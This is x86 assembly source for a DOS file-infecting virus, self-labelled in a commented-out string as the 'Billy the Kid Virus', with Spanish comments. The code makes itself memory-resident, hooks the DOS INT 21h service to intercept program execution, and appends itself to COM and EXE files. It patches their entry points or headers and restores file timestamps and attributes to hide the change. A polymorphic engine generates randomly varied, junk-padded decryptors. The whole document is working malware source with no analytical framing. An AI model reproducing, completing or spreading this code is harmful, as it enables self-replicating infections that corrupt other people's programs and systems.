        assume ss:codevir

pila    segment stack 'stack'
        db 64 dup ('12345678')
pila    ends


code    segment
anfitrion:
        assume cs:code, ds:code
        mov ah, 02h
        mov dl, 'z'
        int 21h
        mov ax, 4C00h
        int 21h
code    ends



codevir segment
        assume cs:codevir, ds:codevir
start:
        mov cx, (offset fincomienzo)-(offset comienzo)+(longi)+16
        mov si, offset comienzo   ;   Puesto por el compilador
bucleen:
        xor byte ptr cs:[si],00h
        xor byte ptr cs:[si],00h
        inc si
        loop bucleen

;***comienzo***
comienzo:
        call acanomas
acanomas label near
        pop ax
        add ax, offset fincomienzo - offset acanomas
        test al, 0Fh
        jz noinc
        add ax, 0010h
noinc:
        mov cl, 04h
        shr ax, cl
        mov cx, ax
        push cs
        pop bx
        add bx, cx
        xor ax, ax
        push cs

        push bx
        push ax
        retf                 ; Salto a OFS0
fincomienzo:
codevir ends

;***OFS0***
porfin  segment
        assume cs:porfin, ds:porfin
                             ; Estoy en offset 0 con el segmento anterior
                             ;   en la pila
        add cs:[segcsm], cx
        mov ah, 0DDh
        int 21h
        cmp ax, 'LO'
        mov cs:[segant], ds
        push cs              ; DS = Ac 
        pop ds               ; ES = Anterior
        pop es               ;
        jnz noactivo
        jmp correr
noactivo:
        push ds
        push es
        cld
        mov ds, [segant]
        push cs
        pop es
        mov cx, 0010h
        xor si, si
        mov di, offset bufpsp
        rep movsb
        pop es
        pop ds

        call activar

        push es
        mov es, [segant]
        mov cx, 0010h
        xor di, di
        mov si, offset bufpsp
        rep movsb
        pop es
correr:
        cmp byte ptr [origen], 'C'
        jnz desdeexe
desdecom:
        mov si, offset original  ; Los 3 bytes del comienzo original
        mov di, 0100h
        cld
        movsw
        movsb

        mov ds, [segant]
        push ds
        mov ax, 0100h
        push ax
        retf                    ; Al comienzo del anfitri¢n
desdeexe:
        mov cx, [ofsexe]
        mov bx, cs
        sub bx, [segcsm]
        mov ax, [segstk]
        add ax, bx
        cli
        mov ss, ax
        mov sp, [ofsstk]
        sti
        mov ax, [segexe]
        add ax, bx
        mov es, [segant]
        mov ds, [segant]
        push ax
        push cx
        retf                    ; Al comienzo del anfitri¢n




activar proc
        cli
        push es
        mov es, [segant]
        mov ah, 49h
        int 21h
        mov ah, 48h
        mov bx, 0FFFFh
        int 21h
        sub bx, tamres+1
        mov ah, 4Ah
        int 21h

        mov ax, es
        add ax, bx
        mov word ptr cs:[bufpsp + 0002h], ax

        mov ah, 48h
        mov bx, tamres
        int 21h
        mov es, ax
        call recubre

copiamem:
        xor si, si
        mov di, si
        mov cx, longi
        cld
        rep movsb

        push es
        pop ds
        mov ax, 3521h
        int 21h
        mov [int21cs], es
        mov [int21ip], bx
        mov dx, offset handler
        call setintvec

        push cs
        pop ds

noalcanza:
        pop es
        sti
        ret
activar endp



recubre   proc
          push ax
          mov ax, es
          dec ax
          mov es, ax
          mov word ptr es:[0001h], 0008h
          mov ax, es
          inc ax
          mov es, ax
          pop ax
          ret
recubre   endp



setintvec proc
;  Entrada:
;    AL     : N£mero de interrupci¢n
;    DS:DX  : Puntero al handler

        pushf
        push ax
        push bx
        push es

        cli
        xor bh, bh
        mov bl, al
        shl bx, 01h
        shl bx, 01h
        xor ax, ax
        mov es, ax
        mov es:[bx], dx
        mov es:[bx+02h],ds

        pop es
        pop bx
        pop ax
        popf
        ret
setintvec endp



handler proc
        cmp ah, 0DDh
        jne vamo
        mov ax, 'LO'
        iret
vamo:
        cmp ah, 4Bh
        je fexec
finfexec:
        jmp dword ptr cs:[int21ip]
handler endp



fexec   proc
        cld
        push ax
        push bx
        push cx
        push dx
        push si
        push di
        push bp
        push ds
        push es

        mov ah, 48h
        mov bx, 0100h
        pushf
        call dword ptr cs:[int21ip]
        jc memoerror1
        mov es, ax

        push es
        push ds
        push dx
        mov ax, 3524h
        pushf
        call dword ptr cs:[int21ip]
        mov cs:[int24ip], bx
        mov cs:[int24cs], es
        mov dx, offset hand24
        push cs
        pop ds
        call setintvec
        pop dx
        pop ds
        pop es


        call getattr

        mov ax, 3D02h
        pushf
        call dword ptr cs:[int21ip]
        jc openerror1

        push ds
        push dx
        mov bx, ax
        mov cs:[fhandle], ax
        mov ah, 3Fh
        mov cx, 0004h
        push cs
        pop ds
        mov dx, offset original   ; Estos bytes ahora est n inutilizados
        pushf
        call dword ptr cs:[int21ip]
        pop dx
        pop ds
        jc readerror1

        push dx
        mov ax, 5700h
        pushf
        call dword ptr cs:[int21ip]
        mov cs:[fhora], cx
        mov cs:[ffecha],dx
        pop dx
        and cl, 00000111b
        cmp cl, 00000101b
        jz readerror1          ; 'ta listo



        push ds
        push dx

        xor bp, bp
        cmp cs:[original],'ZM'
        jz dale                    ; Dale al COM
        inc bp
        jmp dale                   ; Dale al EXE

openerror1:                        ;  Para permitir saltos cortos
        jmp openerror              ;
memoerror1:                        ;
        jmp memoerror              ;
readerror1:                        ;
        jmp readerror              ;
writeerror1:                       ;
        jmp writeerror             ;

dale:
        push cs
        pop ds
        mov [origen],'C'
        or bp, bp
        jnz escom1
        mov [origen],'E'
escom1:
        call alineafile   ; DX:AX = Nueva longitud del archivo
        cmp dl, 08h
        ja writeerror1    ; Archivo de mas de 600k
        push ax
        push dx
        mov cs:[longhi], dx
        mov cs:[longlo], ax


        call crea          ; DI = Longitud del bloque a meter
        jnc bien
        pop ds
        pop ax
        jmp writeerror

bien:
        mov bx, [fhandle]
        push es
        pop ds


        pop dx
        pop ax

        push ax
        add ax, 0100h
        mov si, cs:[ddespl]
        or bp, bp
        jz esexe2
        add [si+01h], ax
esexe2:
        mov cx, di
        mov ah, 40h
        xor dx, dx
        pushf
        call dword ptr cs:[int21ip]
        pop dx
        jc writeerror
        cmp ax, cx
        jb writeerror

        push cs
        pop ds
        sub dx, 0003h
        mov [dsalto], dx
        mov ax, 4200h
        xor cx, cx
        mov dx, cx
        pushf
        call dword ptr cs:[int21ip]

        or bp, bp
        jz esexe3
        mov ah, 40h
        mov cx, 0003h
        mov dx, offset cambiazo
        pushf
        call dword ptr cs:[int21ip]
        jc writeerror
esexe3:

        mov dx,[ffecha]
        mov cx,[fhora]
        and cl, 11111000b
        or cl, 00000101b
        mov ax, 5701h
        pushf
        call dword ptr cs:[int21ip]
writeerror:
        pop dx
        pop ds

readerror:
        mov ah, 3Eh
        pushf
        call dword ptr cs:[int21ip]

openerror:
        call setattr

        mov dx, [int24ip]
        mov ds, [int24cs]
        mov al, 24h
        call setintvec

        mov ah, 49h
        pushf
        call dword ptr cs:[int21ip]

memoerror:
        pop es
        pop ds
        pop bp
        pop di
        pop si
        pop dx
        pop cx
        pop bx
        pop ax
        jmp finfexeC
fexec   endp




alineafile proc
        xor cx, cx
        mov dx, cx
        mov ax, 4202h
        pushf
        call dword ptr cs:[int21ip]
        mov cx, ax
        neg cl
        and cx, 000Fh
        mov cs:[agregado], cx
        mov ah, 40h
        pushf
        call dword ptr cs:[int21ip]
        mov ax, 4202h
        xor cx, cx
        mov dx, cx
        pushf
        call dword ptr cs:[int21ip]
        ret
alineafile endp



getattr proc
        mov ax, 4300h
        pushf
        call dword ptr cs:[int21ip]
        mov cs:[fattr], cx
        mov ax, 4301h
        xor cx, cx
        pushf
        call dword ptr cs:[int21ip]
        ret
getattr endp


setattr proc
        mov ax,4301h
        mov cx, cs:[fattr]
        pushf
        call dword ptr cs:[int21ip]
        ret
setattr endp



hand24  proc
        xor al, al
        iret
hand24  endp



crea    proc
; Entrada
;     ES   :=    Segmento a donde se va a crear
;     DS   :=    Segmento de c¢digo
; Salida
;     DI   :=   Longitud

        xor di, di
        push bx
        call genpar
        pop bx
        push di
        mov cx, offset fincomienzor-offset comienzor
        mov si, offset comienzor
        rep movsb
alinea:
        test di, 000Fh
        jz yalineado
        inc di
        jmp alinea
yalineado:

        or bp, bp
        jnz escom41


        push ds

        push es
        pop ds

        xor cx, cx
        mov dx, cx
        mov ax, 4200h
        pushf
        call dword ptr cs:[int21ip]

        mov ah, 3Fh
        mov cx, 001Ch
        lea dx, [di+offset finporfin]
        mov si, dx
        pushf
        call dword ptr cs:[int21ip]
        jc puchaaaa1

        mov ax, cs:[longlo]       ;
        mov dx, cs:[longhi]       ; Compruebo si tiene overlays
        sub ax, cs:[agregado]     ;
        sbb dx, 0000h             ;
        mov cx, 0200h             ;
        div cx                    ;
        or dx, dx                 ;
        jz nomas2                 ;
        inc ax                    ;
nomas2:                           ;
        cmp dx, [si+02h]          ;
        jne puchaaaa1             ;
        cmp ax, [si+04h]          ;
        jne puchaaaa1             ;

        mov ax, [si+08h]
        mov cs:[shead], ax
        mov ax, [si+0Ah]
        mov cs:[minimo], ax
        mov ax, [si+10h]
        mov cs:[ofsstk], ax
        mov ax, [si+0Eh]
        mov cs:[segstk], ax
        mov ax, [si+14h]
        mov cs:[ofsexe], ax
        mov ax, [si+16h]
        mov cs:[segexe], ax

        push bx

        jmp fsdf


puchaaaa1:
        jmp puchaaaa
escom41:
        jmp escom4


fsdf:
        mov ax, cs:[longlo]
        mov dx, cs:[longhi]

        push ax
        push dx

        add ax, offset finporfin
        adc dx, 0000h
        add ax, di
        adc dx, 0000h

        mov cx, 0200h
        div cx

        or dx, dx
        jz nomas1
        inc ax
nomas1:
        mov [si+02h], dx
        mov [si+04h], ax
        mov cs:[fsize], ax
        pop dx
        pop ax
        mov bx, dx
        mov cl, 04h
        shr ax, cl
        shr dx, cl
        mov cl, 0Ch
        and bx, 000Fh
        shl bx, cl
        or ax, bx
        pop bx
        sub ax, [si+08h]
        mov [si+16h], ax
        mov cs:[segcsm], ax
        dec ax
        mov [si+0Eh], ax
        lea ax, [di+offset finporfin+00FFh]
        mov [si+10h], ax
        mov word ptr [si+14h], 0000h

        mov ax, 4200h
        xor cx, cx
        mov dx, cx
        pushf
        call dword ptr cs:[int21ip]

        mov ah, 40h
        mov cx, 001Ch
        mov dx, si
        pushf
        call dword ptr cs:[int21ip]
        jc puchaaaa
        pop ds
escom4:
        xor si, si
        mov cx, offset finporfin
        rep movsb
        mov ax, di
        pop di
        push ax
        sub ax, di
        mov cx, ax
        dec ax
        dec ax
        mov si, di
        mov di, [dlongit]
        mov es:[di+01h], ax
        pop di

        push ds
        push es
        pop ds
        call encript
        pop ds
        mov ax, 4202h
        xor cx, cx
        mov dx, cx
        pushf
        call dword ptr cs:[int21ip]
        clc
        ret

puchaaaa:
        pop ds
        pop di
        stc
        ret
crea    endp










;*******************COMIENZO DE RUTINAS PMORFICAS******************
rand    proc near
        push ds
        push es
        push bx

        xor ax, ax
        mov es, ax
        mov ax, cs:[segale]
        cmp ax, 61440
        jb menor
        mov ax, 61339
menor:
        mov ds, ax
        mov bx, cs:[ofsale]
        mov ax, [bx]
        mov cs:[segale], ax
        mov bx, es:[046Ch]
        mov ax, [bx]
        add bx, ax
        mov cs:[ofsale], bx
        mov ax, [bx+10]
        xor ax, bx
        pop bx
        pop es
        pop ds
        ret
rand    endp



encript proc near
;Entrada
;   DS:SI := Puntero a comienzo
;   CX    := Longitud

        push si
bucle:
clave1  label byte
        db 80h, 34h, 0FFh   ; xor byte ptr [si],0FFh
clave2  label byte
        db 80h, 04h, 0FFh   ; add byte ptr [si],0FFh
        inc si
        loop bucle
        pop si
        ret
encript endp




fillclv proc near
;ENTRADA
;    DH : Clave(0=Clave1/1=Clave2)

        xor bh, bh
        call rand
        mov bl, al
        and bl, 03h                     ; 03h = 00000011b
        mov al, 80h
        mov ah, offset tencri[bx]
        or dh, dh
        jz sc2
        mov word ptr ds:[offset clave1], ax
        mov ah, offset tencri[bx+4]
        mov word ptr ds:[offset clavd1], ax
        jmp short finfillclv
sc2:
        mov word ptr ds:[offset clave2], ax
        mov ah, offset tencri[bx+4]
        mov word ptr ds:[offset clavd2], ax
finfillclv:
        ret
fillclv endp




pone    proc near
;Entrada
;   AH := Modo (0=in£til/1=£til)

        push cx

        or ah, ah
        jz noutil

        xor dh, dh
        mov dl, 0Ah
        sub dl, cl
        cmp dl, 03h
        jz estres
        cmp dl, 04h
        jz escuatro
        cmp dl, 05h
        jz  esdos
        cmp dl, 08h
        jz  esocho
        jmp listo
esdos:
        mov [dirbucle], di
        jmp listo
estres:
        mov [dlongit], di
        jmp listo
escuatro:
        mov [ddespl], di
        jmp listo
esocho:
        mov [dirfbucle], di

listo:
        mov cx, offset tablas
        mov bx, offset tablasi
        call lopone
        jmp short finpone
noutil:
        push cx
        mov ah, 2Ah       ; Get system date
        pushf
        call dword ptr cs:[int21ip]
        mov si, dx
        mov ah, 2Ch       ; Get system time
        pushf
        call dword ptr cs:[int21ip]
        xor si, dx
        and si, 0001h     ; 0003h= 00000000 00000001b
        inc si
        mov cx, si
bucle2:
        push cx
        call rand
        xor dh, dh
        mov dl, al
        and dl, 07h       ; 07h = 00000111b
        mov cx, offset tablln
        mov bx, offset tablano
        call lopone
        pop cx
        loop bucle2
        pop cx

finpone:
        pop cx
        ret

proc    lopone
        shl dl, 1
        add dx, cx
        push bx
        mov bx, dx
        mov ax, [bx]
        pop bx
        mov cl, ah
        xor ch, ch
        mov si, bx
        xor ah, ah
        add si, ax
        cld
        rep movsb
        ret
lopone  endp
pone    endp





genpar  proc near
;Entrada
;   ES:DI := Puntero a desencriptor a generar
;   DS    := Segmento de c¢digo

        push ds
        push es

        push cs
        pop ds

        call rand

        mov ds:[offset clavd2+2], ah       ;
        mov ds:[offset clave2+2], ah       ; Set up claves
        mov ds:[offset clavd1+2], al       ;
        mov ds:[offset clave1+2], al       ;

        xor dh, dh
        call fillclv
        inc dh
        call fillclv

        mov cx, 000Ah
        pop es
bucle1:
        xor ah, ah
        call pone
        inc ah
        call pone
        loop bucle1

        push di
        mov di, [dirfbucle]
        inc di
        mov ax, di
        inc ax
        sub ax, [dirbucle]
        neg ax
        stosb
        mov di, [ddespl]
        pop ax
        mov es:[di+01h], ax
        mov di, ax
        pop ds
        ret
genpar  endp



;************************TABLA DE ENCRIPTORES******************
tencri  label byte
        db 04h
        db 2Ch
        db 34h
        db 34h

        db 2Ch
        db 04h
        db 34h
        db 34h


;************************FIN TABLA ENCRIPTORES******************


;****************************TABLA UTIL***************************
tablas  db 00, 01, 01, 01, 02, 01, 03, 03, 06, 03, 09, 03, 12, 03, 15, 01
        db 16, 02, 18, 01
tablasi label byte
        db 1Eh            ; push ds
        db 0Eh            ; push cs
        db 1Fh            ; pop ds
        db 0B9h           ; mov cx, Longitud a desencriptar
dlongit  dw ?             ;
        db 0BEh           ; mov si, Comienzo
ddespl   dw ?             ;
clavd2  db 3 DUP (?)
clavd1  db 3 DUP (?)
        db 46h            ; inc si
        db 0E2h           ; loop bucle
salto    db ?
        db 1Fh            ; pop ds
;******************************FIN TABLA UTIL************************

;****************************TABLA INUTIL***************************
tablln  DB 00, 01, 01, 03, 04, 03, 07, 01, 08, 01, 09, 04, 13, 05, 18, 01
tablano label byte
        db 90h
        db 25h, 0FFh, 0FFh
        db 0Dh, 00h, 00h
        db 0F8h
        db 0F9h
        db 81h, 0C9h, 00h, 00h
        db 80h, 06h, 34h, 12h, 00h
        db 0FCh
;***********************FIN TABLA INUTIL**************************


;****************************VARIABLES***************************
dirbucle  dw ?
dirfbucle dw ?
segale    dw ?
ofsale    dw ?

;*****************************FIN DE RUTINAS PMORFICAS****************




;Repetici¢n, pero en el otro segmento para que quede residente

comienzor:
        call acanomasr
acanomasr label near
        pop ax
        add ax, offset fincomienzor - offset acanomasr
        test al, 0Fh
        jz noincr
        add ax, 0010h
noincr:
        mov cl, 04h
        shr ax, cl
        mov cx, ax
        push cs
        pop bx
        add bx, ax
        xor ax, ax
        push cs

        push bx
        push ax
        retf                 ; Salto a OFS0
fincomienzor:

;*****************************VARIABLES*******************************

longi    = offset finporfin
tamres   = 0100h
segant   dw ?
origen   db 'E'

bufpsp   db 10h dup(?)

original label word
segexe   dw 32
ofsexe   dw 0
segcsm   dw 33
segstk   dw 0
ofsstk   dw 0200h
fsize    dw 3
shead    dw 32
minimo   dw 1


fhandle  dw ?
fhora    dw ?
ffecha   dw ?
fattr    dw ?

tapon    db 'COMMAND'

cambiazo db 0E9h
dsalto   DW ?

longlo   dw ?
longhi   dw ?

int21ip  dw ?
int21cs  dw ?
int24ip  dw ?
int24cs  dw ?

agregado dw ?

;         db ' (C)1994 S.A.O. Texas. Billy the Kid Virus.'
;         db ' Look out boy! This is the only far west virus that will make'
;         db ' you cry for being born.'
;         db ' P.S. : Listen Led Zeppelin and AC/DC with your sons and God'
;         db ' will bless ya. '
;         db ' Leave Castro alone.'
;         db ' Superman... Why don't you fuck Luisa????'
;         db " That's not a fuckin grafitti, it's a sign."
;         db 'Jeroboam y todo el pueblo volvieron a ver a Rehoboam al tercer '
;         db 'dia como lo ordeno el rey.'
;         db 'I hate moscas.'
;         db 'Hecho en China...no piensen que se hizo aca en Argentina.'



finporfin label byte
porfin   ends

         end start

